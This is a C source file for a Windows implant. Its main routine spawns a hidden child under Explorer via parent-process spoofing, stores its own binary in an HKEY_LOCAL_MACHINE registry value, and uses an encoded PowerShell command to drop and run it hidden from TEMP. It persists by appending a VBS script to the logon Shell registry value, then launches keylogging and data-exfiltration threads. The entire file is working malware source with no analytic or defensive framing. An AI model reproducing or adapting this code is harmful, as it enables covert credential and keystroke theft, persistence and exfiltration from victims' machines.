#include <winsock2.h>
#include "libs/winexfil.h"
#include "libs/winkeylog.h"
#include "libs/winencode.h"
#include "libs/winvbs.h"
#include "gamble.c"
#include <windows.h>
#include <stdio.h>
#include "winconsts.h"

int isInRegistry() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    return (strstr(szPath, "TEMP") != NULL || strstr(szPath, PROC_NAME) != NULL);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    DBG("MAIN is being executed!");
    if (!strstr(lpCmdLine, "-d")) {
        DBG("No deploy, so spawning elevated child process under explorer...");
        HWND hShell = GetShellWindow();
        DWORD targetPid = 0;
        GetWindowThreadProcessId(hShell, &targetPid);
        if (targetPid == 0) return 0;
        HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        HANDLE hToken = NULL;
        HANDLE hNewToken = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
                PROCESS_INFORMATION pi = {0};
                STARTUPINFOEXA si = {0};
                SIZE_T size = 0;
                InitializeProcThreadAttributeList(NULL, 1, 0, &size);
                si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
                InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
                UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL);
                si.StartupInfo.cb = sizeof(si);
                char szPath[MAX_PATH];
                GetModuleFileNameA(NULL, szPath, MAX_PATH);
                char payloadCmd[MAX_PATH + 20];
                snprintf(payloadCmd, sizeof(payloadCmd), "\"%s\" -d", szPath);
                if (CreateProcessAsUserA(hNewToken, NULL, (char*)payloadCmd, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
                    DBG("Elevated child spawned under Explorer.");
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                DeleteProcThreadAttributeList(si.lpAttributeList);
                HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
                CloseHandle(hNewToken);
            }
            CloseHandle(hToken);
        }
        CloseHandle(hExplorer);
        return 0;
    }
    char cmd[512];
	snprintf(cmd, sizeof(cmd), 
    	"$b=(Get-ItemProperty 'Registry::HKEY_LOCAL_MACHINE\\%s').DEBUG;"
    	"$p=\"$env:TEMP\\%s\";[IO.File]::WriteAllBytes($p,$b);"
    	"Start-Process $p -WindowStyle Hidden", MAIN_REGISTRY, PROC_NAME);
	const char* encodedPayload = encodeForPowerShell(cmd);
    if (isInRegistry()) {
        DBG("I am in the TEMP file! Starting threads...");
		if (!hasVBS()) { dropVBS(encodedPayload); }
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKey, NULL, 0, NULL);
		HANDLE hExfilThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exfilThread, NULL, 0, NULL);
        HANDLE hWheelThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WheelThread, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		return 0;
	}
    DBG("I am not in the TEMP file, so I will write to registry");
    // write entire exe to registry
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    FILE* file = fopen(szPath, "rb");
    if (!file) return 0;
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);
    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    fread(buffer, 1, fileSize, file);
    fclose(file);
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, MAIN_REGISTRY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DEBUG", 0, REG_BINARY, buffer, fileSize);
        RegCloseKey(hKey);
    }
    free(buffer);
    // create vbs and write to registry
    DBG("Dropping VBS!");
    dropVBS(encodedPayload);
    char currentShell[512], newShell[1024];
    DWORD dwSize = sizeof(currentShell);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, ACTIVATE_REGISTRY, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "Shell", NULL, NULL, (LPBYTE)currentShell, &dwSize) == ERROR_SUCCESS) {
            if (strstr(currentShell, "wininit.ini.vbs") == NULL) {
                snprintf(newShell, sizeof(newShell), "%s, wscript.exe \"%s\"", currentShell, VBS_PATH);
                RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)newShell, strlen(newShell) + 1);
            }
        }
        RegCloseKey(hKey);
    }
    // dont run these while in ansible
    char vbscmd[MAX_PATH + 30];
    snprintf(vbscmd, sizeof(vbscmd), "wscript.exe //B \"%s\"", VBS_PATH);
    WinExec(vbscmd, 0);
    DBG("I ran the VBS file...");
    return 0;
}